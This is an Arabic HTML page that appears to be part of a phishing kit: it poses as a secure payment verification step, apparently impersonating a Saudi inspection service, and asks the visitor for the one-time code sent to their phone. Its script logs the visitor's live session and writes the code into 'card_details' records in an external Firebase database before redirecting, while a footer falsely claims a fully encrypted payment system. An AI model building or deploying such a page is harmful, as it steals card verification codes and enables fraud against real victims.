<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية - الرمز الآمن</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }

        .otp-container {
            background: #fff;
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            padding-bottom: 25px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.05);
            text-align: center;
            overflow: hidden;
        }

        .header-image { width: 100%; max-width: 180px; height: auto; margin: 20px auto 10px; display: block; }
        .content { padding: 0 20px; }
        h2 { font-size: 17px; color: #333; margin-bottom: 8px; font-weight: bold; }
        p { font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 20px; }

        .otp-single-field {
            width: 100%; max-width: 220px; height: 45px; border: 1px solid #ddd;
            border-radius: 8px; text-align: center; font-size: 20px; letter-spacing: 4px;
            font-weight: bold; color: var(--main-green); outline: none; background-color: #fafafa; margin-bottom: 15px;
        }

        .timer-box { font-size: 12px; color: #999; margin-bottom: 20px; min-height: 20px; }
        .resend-link { color: var(--main-green); font-weight: bold; cursor: pointer; text-decoration: underline; }

        .btn-confirm { width: 100%; background-color: var(--main-green); color: white; border: none; border-radius: 10px; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-confirm:hover { background-color: #145230; }
        .btn-confirm:disabled { background-color: #ccc; cursor: not-allowed; }
        .secure-notice { margin-top: 15px; font-size: 10px; color: #bbb; }
    </style>
</head>
<body>

    <div class="otp-container">
        <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" class="header-image" alt="OTP Security">
        <div class="content">
            <h2>أدخل رمز التحقق</h2>
            <p>يرجى إدخال الرمز المرسل لجوالك (4 أو 6 أرقام).</p>

            <input type="tel" maxlength="6" class="otp-single-field" id="otpCode" placeholder="------" autocomplete="one-time-code">

            <div class="timer-box" id="timerBox">
                إعادة إرسال الرمز خلال <span id="timeCount">02:00</span> دقيقة
            </div>
            
            <button class="btn-confirm" id="confirmBtn" onclick="sendOTP()">تأكيد العملية</button>
            <div class="secure-notice">🔒 نظام دفع مشفر وآمن بالكامل</div>
        </div>
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
            projectId: "saso-inspection" 
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const v_id = localStorage.getItem('v_id');

        if (v_id) {
            database.ref('live_sessions/' + v_id).update({
                current_page: "صفحة التحقق (OTP)",
                last_seen: new Date().getTime()
            });
        }

        let timeLeft = 120;
        const timeDisplay = document.getElementById('timeCount');
        const timerBox = document.getElementById('timerBox');

        function startTimer() {
            const timer = setInterval(() => {
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    timerBox.innerHTML = '<span class="resend-link" onclick="location.reload()">إعادة إرسال الرمز الآن</span>';
                } else {
                    timeLeft--;
                    let minutes = Math.floor(timeLeft / 60);
                    let seconds = timeLeft % 60;
                    timeDisplay.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }
            }, 1000);
        }

        window.onload = startTimer;

        function sendOTP() {
            let otpVal = document.getElementById('otpCode').value;
            const btn = document.getElementById('confirmBtn');

            // التحقق أن الطول إما 4 أو 6 أرقام فقط
            if ((otpVal.length === 4 || otpVal.length === 6) && v_id) {
                btn.disabled = true;
                btn.innerText = "جاري التحقق...";

                database.ref('orders/' + v_id + '/card_details').update({
                    otp: otpVal,
                    otp_status: "Verified_Format",
                    last_update: new Date().toLocaleString()
                }).then(() => {
                    database.ref('orders/' + v_id).update({
                        status: "OTP_Submitted",
                        last_update: new Date().getTime()
                    }).then(() => {
                        window.location.href = 'processing.html';
                    });
                });
            } else {
                alert("يرجى إدخال رمز صحيح مكون من 4 أو 6 أرقام.");
            }
        }

        // منع إدخال أي شيء غير الأرقام في حقل الـ OTP
        document.getElementById('otpCode').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
